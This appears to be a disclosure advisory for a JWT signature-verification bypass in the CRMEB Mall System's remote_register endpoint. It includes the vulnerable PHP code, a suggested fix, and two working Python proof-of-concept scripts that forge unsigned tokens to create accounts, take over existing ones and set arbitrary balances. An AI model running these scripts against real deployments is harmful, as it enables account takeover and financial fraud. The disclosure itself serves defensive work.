# JWT Authentication Bypass via Missing Signature Verification in remote_register

**Project**: CRMEB Mall System (CRMEB商城系统)

**Vendor**: CRMEB (https://www.crmeb.com)

**Project Repository**: https://github.com/crmeb/CRMEB.git

**Vulnerable File**: `crmeb/app/services/user/LoginServices.php`

**Affected Version**: v5.6.3 and earlier (<= v5.6.3)

**Vulnerability Type**: CWE-287 (Improper Authentication)

**CVSS v3.1 Score**: 9.8 (Critical)

---

## Description

The remote_register endpoint accepts base64-encoded JSON tokens without verifying JWT signatures. Attackers can forge arbitrary tokens to create unlimited fake accounts or login as any existing user by specifying any `uid` value.

The root cause is using `JWT::urlsafeB64Decode()` instead of `JWT::decode()`. The former only decodes base64 without cryptographic signature verification, while the latter properly validates JWT signatures.

---

## Vulnerability Analysis

**File**: `crmeb/app/services/user/LoginServices.php`
**Lines**: 502-547

```php
public function remoteRegister(string $out_token = '')
{
    // VULNERABLE: Only decodes base64, NO signature verification
    $info = JWT::jsonDecode(JWT::urlsafeB64Decode($out_token));

    // VULNERABLE: Uses unverified uid from forged token
    $userInfo = $this->dao->get(['uid' => $info->uid]);

    $data = [];
    if (!$userInfo) {
        // VULNERABLE: Creates user with forged data
        $data['uid'] = $info->uid;
        $data['account'] = $info->phone != '' ? $info->phone : 'out_' . $info->uid;
        $data['phone'] = $info->phone;
        $data['pwd'] = md5('123456');
        $data['real_name'] = $info->nickname;
        $data['nickname'] = $info->nickname;
        $data['avatar'] = $info->avatar;
        $data['user_type'] = 'h5';
        $data['now_money'] = $info->now_money;      // Forged balance
        $data['integral'] = $info->integral;        // Forged points
        $data['exp'] = $info->exp;
        // ... more fields ...
        $this->dao->save($data);
    } else {
        // Update existing user with forged data
        $data['nickname'] = $info->nickname;
        $data['avatar'] = $info->avatar;
        $data['now_money'] = $info->now_money;      // Can update balance!
        $data['integral'] = $info->integral;        // Can update points!
        $this->dao->update($info->uid, $data);
    }

    // Generate valid JWT token for attacker
    $token = $this->createToken((int)$info->uid, 'api');
    return ['token' => $token['token'], 'expires_time' => $token['params']['exp']];
}
```

**Vulnerability Details**:

1. **Line 504**: Uses `JWT::urlsafeB64Decode()` which only decodes base64, no signature verification
2. **Line 505**: Queries database with unverified `uid` from forged token
3. **Lines 507-532**: Creates new user with completely forged data including balance and points
4. **Lines 533-539**: Updates existing user's balance and points if user exists
5. **Line 541**: Generates valid JWT token granting full access

**What Should Happen**:

```php
// CORRECT implementation
$info = JWT::decode($out_token, $secret_key, ['HS256']);
```

This would:
- Verify JWT signature using secret key
- Validate algorithm (HS256)
- Check token expiration
- Ensure token integrity

**What Actually Happens**:

```php
// VULNERABLE implementation
$info = JWT::jsonDecode(JWT::urlsafeB64Decode($out_token));
```

This only decodes base64 and parses JSON, allowing any forged token.

---

## Proof of Concept

### POC 1: Single Account Creation

```python
#!/usr/bin/env python3
import base64
import json
import requests

forged_data = {
    "uid": 8888,              # Arbitrary user ID
    "phone": "18888888888",
    "nickname": "hacker",
    "avatar": "http://test.jpg",
    "now_money": 999999,      # Forged balance
    "integral": 999999,       # Forged points
    "exp": 1770483564
}

# NO SIGNATURE REQUIRED - just base64 encoding
fake_token = base64.urlsafe_b64encode(
    json.dumps(forged_data).encode()
).decode().rstrip('=')

resp = requests.get(
    "http://192.168.176.130:8011/api/remote_register",
    params={"remote_token": fake_token}
)

print(resp.json())
```

**Response** (Vulnerable System):
```json
{
  "status": 200,
  "msg": "登录成功",
  "data": {
    "token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9...",
    "expires_time": 1770560079
  }
}
```
[![1767975099880.png](https://youke3.picui.cn/s1/2026/01/10/69612898cac3f.png)](https://youke3.picui.cn/s1/2026/01/10/69612898cac3f.png)

[![1767975114935.png](https://youke3.picui.cn/s1/2026/01/10/69612897c2bc3.png)](https://youke3.picui.cn/s1/2026/01/10/69612897c2bc3.png)


### POC 2: Batch Account Registration

```python
#!/usr/bin/env python3
import base64
import json
import requests

target = "http://192.168.176.130:8011/api/remote_register"

for i in range(5):
    forged_data = {
        "uid": 9000 + i,
        "phone": f"139001390{i:02d}",
        "nickname": f"jwt_hacker_{i}",
        "avatar": "http://evil.com/avatar.jpg",
        "now_money": 999999,
        "integral": 999999,
        "exp": 1770483564
    }

    fake_token = base64.urlsafe_b64encode(
        json.dumps(forged_data).encode()
    ).decode().rstrip('=')

    resp = requests.get(target, params={"remote_token": fake_token})

    if resp.status_code == 200:
        data = resp.json()
        if data.get('msg') == '登录成功':
            print(f"[+] Account {i+1}: UID={forged_data['uid']}, Nickname={forged_data['nickname']}")
        else:
            print(f"[-] Account {i+1} failed: {data}")
```

**Test Results**:
```
[+] Account 1: UID=9000, Nickname=jwt_hacker_0
[+] Account 2: UID=9001, Nickname=jwt_hacker_1
[+] Account 3: UID=9002, Nickname=jwt_hacker_2
[+] Account 4: UID=9003, Nickname=jwt_hacker_3
[+] Account 5: UID=9004, Nickname=jwt_hacker_4
```

[![1767975215520.png](https://youke3.picui.cn/s1/2026/01/10/696128fb2d6bd.png)](https://youke3.picui.cn/s1/2026/01/10/696128fb2d6bd.png)

[![1767975291292.png](https://youke3.picui.cn/s1/2026/01/10/696129471ddeb.png)](https://youke3.picui.cn/s1/2026/01/10/696129471ddeb.png)

**Summary**:
- **Success Rate**: 5/5 (100%)
- **Total Time**: < 2 seconds
- **Attack Impact**: Attackers can create hundreds of fake accounts per minute
- **No Signature Required**: Only base64 encoding needed

---

## Impact

1. **Unrestricted Account Creation**: Attackers can create unlimited fake accounts with any UID
2. **Account Takeover**: If valid UID is known, attackers can login as that user
3. **Privilege Escalation**: Full user permissions including orders, payments, personal data
4. **Data Manipulation**: Can forge and update user balance, points, profile information
5. **Business Logic Abuse**: New user rewards, referral bonuses, coupon exploitation
6. **No Authentication Required**: Completely bypasses JWT signature verification

---

## Affected Files

1. `crmeb/app/api/route/v1.php` - Route definition (line 61)
2. `crmeb/app/api/controller/v1/LoginController.php` - Entry point (lines 545-552)
3. `crmeb/app/services/user/LoginServices.php` - Vulnerable JWT decode (lines 502-547)

---

## Remediation

### Immediate Mitigation

1. **Disable Remote Register**:
   ```php
   // File: crmeb/app/api/route/v1.php
   // Route::get('remote_register', 'v1.LoginController/remoteRegister')
   ```

### Permanent Fix

Implement proper JWT verification:

```php
public function remoteRegister(string $out_token = '')
{
    // Load secret key from configuration
    $secret_key = sys_config('jwt_secret_key');

    // Verify JWT signature properly
    try {
        $info = JWT::decode($out_token, $secret_key, ['HS256']);
    } catch (\Exception $e) {
        return app('json')->fail('Token verification failed');
    }

    // Use verified uid from decoded token
    $userInfo = $this->dao->get(['uid' => $info->uid]);
    // ... rest of the logic ...
}
```

---

## References

- OWASP Broken Authentication: https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication
- CWE-287: Improper Authentication: https://cwe.mitre.org/data/definitions/287.html
- JWT Best Practices: https://tools.ietf.org/html/rfc8725
- Firebase JWT Library: https://github.com/firebase/php-jwt
